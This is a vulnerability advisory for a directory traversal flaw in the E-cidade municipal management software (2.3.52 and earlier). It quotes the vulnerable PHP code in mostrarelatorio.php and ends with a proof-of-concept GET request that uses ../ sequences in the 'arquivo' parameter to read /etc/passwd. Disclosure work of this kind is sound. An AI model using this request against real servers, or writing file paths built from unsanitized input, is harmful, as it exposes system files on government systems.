@@ -1,0 +1,73 @@
+E-cidade Directory Traversal 
+Vendor: DBSeller (www.dbseller.com.br)
+Product: E-cidade - Software Publico de Gestao Municipal
+Vulnerability discovered by vesp3r - vesp3r7c3@gmail.com 
+ 
+ 
+Product Description
+--------------------
+ 
+Intended to computerize the management of Brazilian Municipalities.This includes computerized integration 
+between municipal entities: City Hall, Town Hall, Local Government, Foundations and others.
+The economy of resources is only one of the advantages in the adoption of e-cidade and the freedom of choice 
+of suppliers and ensuring continuity of the system, once supported by the Ministry of Planning.
+ 
+Modules:
+
+- HUMAN RESOURCES MANAGEMENT
+- GEOPROCESSING
+- HEALTH MANAGEMENT EDUCATION MANAGEMENT
+- BUSINESS INTELIGENCE
+- FINANCIAL MANAGEMENT
+- TAX MANAGEMENT
+- ASSET MANAGEMENT
+
+Advisory Timeline
+-----------------
+
+No vendor response
+
+
+Vulnerable version:
+-------------------
+
+2.3.52 and prior 
+
+Vulnerability
+-------------
+
+The vulnerability exists within 'mostrarelatorio.php' file of the package:
+the 'arquivo' variable is requested via GET method. It is passed as a variable to another variable called 'arq'. 
+This variable incorporates a call to the file() function.
+ 
+ /fpdf151/mostrarelatorio.php:
+ -----------------------------
+
+[Snip...]
+
+
+if(!file_exists("/tmp/".$arquivo)) {
+  echo "<script> 
+  alert('Codigo nao Encontrado.');
+  window.close();
+  </script>";
+  exit;
+}
+
+[Snip...]
+
+$pdf=new PDF();
+$pdf->Open();
+$pdf->AliasNbPages();
+$pdf->AddPage();
+$arq = file("/tmp/".$arquivo);
+
+
+[Snip...]
+
+
+
+Proof of Concept
+---------------
+ 
+GET /e-cidade/fpdf151/mostrarelatorio.php?arquivo=./../../../../../../etc/passwd HTTP/1.1
